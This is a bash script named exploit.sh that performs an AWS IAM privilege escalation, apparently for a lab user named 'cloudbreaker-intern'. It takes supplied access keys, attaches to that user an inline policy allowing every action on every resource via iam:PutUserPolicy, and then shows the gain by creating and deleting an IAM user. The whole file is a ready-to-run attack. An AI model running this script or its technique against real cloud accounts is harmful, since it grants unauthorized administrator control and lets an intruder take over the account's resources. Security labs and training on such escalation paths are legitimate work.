#!/bin/bash

# Usage: ./exploit.sh <ACCESS_KEY> <SECRET_KEY>
ACCESS_KEY=$1
SECRET_KEY=$2

if [ -z "$ACCESS_KEY" ]; then
    echo "Usage: ./exploit.sh <ACCESS_KEY> <SECRET_KEY>"
    exit 1
fi

export AWS_ACCESS_KEY_ID=$ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$SECRET_KEY
export AWS_DEFAULT_REGION=us-east-1

echo "[*] Identity Check: Who am I?"
aws sts get-caller-identity --query Arn --output text

echo "------------------------------------------------"
echo "[1] TEST: Trying to create a new user (Should FAIL)..."
aws iam create-user --user-name malicious-admin 2>/dev/null

if [ $? -ne 0 ]; then
    echo "‚úÖ Access Denied (As expected). I am just an intern."
else
    echo "‚ùå Wait... I could create a user? Something is wrong."
fi

echo "------------------------------------------------"
echo "[2] EXPLOIT: Abusing iam:PutUserPolicy to become GOD..."
# We attach an INLINE policy to ourselves giving us AdministratorAccess
aws iam put-user-policy \
    --user-name cloudbreaker-intern \
    --policy-name PwnedAdmin \
    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

echo "[*] Payload delivered. Waiting 5 seconds for AWS consistency..."
sleep 5

echo "------------------------------------------------"
echo "[3] RETEST: Trying to create a new user (Should SUCCEED)..."
aws iam create-user --user-name malicious-admin

if [ $? -eq 0 ]; then
    echo "üòà SUCCESS! Privilege Escalation Complete."
    echo "   I am now an Administrator."
    # Cleanup the proof
    aws iam delete-user --user-name malicious-admin
else
    echo "‚ùå Failed. The exploit didn't work."
fi
